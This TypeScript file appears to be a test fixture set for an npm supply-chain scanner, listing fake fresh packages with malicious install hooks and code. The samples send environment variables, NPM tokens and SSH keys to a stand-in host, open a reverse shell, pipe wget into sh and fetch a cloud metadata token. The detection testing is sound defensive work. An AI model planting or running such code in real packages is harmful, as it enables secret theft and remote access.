import { type FixturePackage, pkgJson } from "./fixtures.ts";

const IP = "203.0.113.42";
const HOST = "collector.evil-exfil.io";

const one = (
  name: string,
  files: FixturePackage["versions"][string]["files"],
  scripts?: Record<string, string>,
): FixturePackage => ({
  name,
  downloads: 30,
  latest: "1.0.0",
  versions: {
    "1.0.0": { files, scripts, maintainer: { name: "x", email: "x@mail.com" }, ageHours: 3 },
  },
});

export const FRESH_ATTACKS: FixturePackage[] = [
  one(
    "fresh-hostname-exfil",
    [
      pkgJson("fresh-hostname-exfil", "1.0.0", { postinstall: "node ./e.js" }),
      {
        path: "e.js",
        content: `fetch('https://${HOST}/c',{method:'POST',body:JSON.stringify(process.env)});`,
      },
    ],
    { postinstall: "node ./e.js" },
  ),

  one(
    "fresh-dns-exfil",
    [
      pkgJson("fresh-dns-exfil", "1.0.0", { postinstall: "node ./d.js" }),
      {
        path: "d.js",
        content: `const dns=require('dns');dns.lookup((process.env.NPM_TOKEN||'x')+'.${HOST}',()=>{});`,
      },
    ],
    { postinstall: "node ./d.js" },
  ),

  one("fresh-runtime-exfil-hostname", [
    pkgJson("fresh-runtime-exfil-hostname", "1.0.0"),
    {
      path: "index.js",
      content: `const h=require('https');h.request('https://${HOST}/x').end(JSON.stringify(process.env));module.exports={};`,
    },
  ]),

  one(
    "fresh-indirect-eval",
    [
      pkgJson("fresh-indirect-eval", "1.0.0", { postinstall: "node ./x.js" }),
      { path: "x.js", content: `const e=(0,eval);e(process.env.PAYLOAD||'1+1');` },
    ],
    { postinstall: "node ./x.js" },
  ),

  one(
    "fresh-reverse-shell-hostname",
    [
      pkgJson("fresh-reverse-shell-hostname", "1.0.0", { postinstall: "node ./r.js" }),
      {
        path: "r.js",
        content: `const net=require('net');const cp=require('child_process');const s=net.connect(4444,'${HOST}');cp.spawn('/bin/sh',[],{stdio:[s,s,s]});`,
      },
    ],
    { postinstall: "node ./r.js" },
  ),

  one(
    "fresh-proto-pollution",
    [
      pkgJson("fresh-proto-pollution", "1.0.0", { postinstall: "node ./p.js" }),
      {
        path: "p.js",
        content: `Object.prototype.isAdmin=true;require('fs').writeFileSync('pwned','1');`,
      },
    ],
    { postinstall: "node ./p.js" },
  ),

  one("fresh-direct-url-dep", [
    {
      path: "package.json",
      content: JSON.stringify({
        name: "fresh-direct-url-dep",
        version: "1.0.0",
        dependencies: { helper: `https://${HOST}/pkg.tgz` },
      }),
    },
    { path: "index.js", content: "module.exports={};" },
  ]),

  one("fresh-packed-fetch-hostname", [
    pkgJson("fresh-packed-fetch-hostname", "1.0.0"),
    {
      path: "index.js",
      content:
        `var a=1,b=2;function c(){return fetch('https://${HOST}',{body:process.env.SECRET})}` +
        "var d=[1,2,3];".repeat(120),
    },
  ]),

  one("fresh-runtime-exfil-ip", [
    pkgJson("fresh-runtime-exfil-ip", "1.0.0"),
    {
      path: "index.js",
      content: `const h=require('https');h.request('http://${IP}/x').end(JSON.stringify(process.env));module.exports={};`,
    },
  ]),

  one(
    "fresh-wget-pipe",
    [pkgJson("fresh-wget-pipe", "1.0.0", { postinstall: `wget -qO- https://${HOST}/x.sh | sh` })],
    { postinstall: `wget -qO- https://${HOST}/x.sh | sh` },
  ),

  one(
    "fresh-node-e-exfil",
    [
      pkgJson("fresh-node-e-exfil", "1.0.0", {
        postinstall: `node -e "require('https').get('http://${IP}/x')"`,
      }),
    ],
    { postinstall: `node -e "require('https').get('http://${IP}/x')"` },
  ),

  one(
    "fresh-imds-gcp",
    [
      pkgJson("fresh-imds-gcp", "1.0.0", { postinstall: "node ./g.js" }),
      {
        path: "g.js",
        content: `fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');`,
      },
    ],
    { postinstall: "node ./g.js" },
  ),

  one(
    "fresh-secret-ssh",
    [
      pkgJson("fresh-secret-ssh", "1.0.0", { postinstall: "node ./s.js" }),
      {
        path: "s.js",
        content: `const fs=require('fs');const k=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');fetch('https://${HOST}',{body:k});`,
      },
    ],
    { postinstall: "node ./s.js" },
  ),

  one(
    "fresh-eval-charcode",
    [
      pkgJson("fresh-eval-charcode", "1.0.0", { postinstall: "node ./c.js" }),
      { path: "c.js", content: `eval(String.fromCharCode(97,108,101,114,116));` },
    ],
    { postinstall: "node ./c.js" },
  ),
];
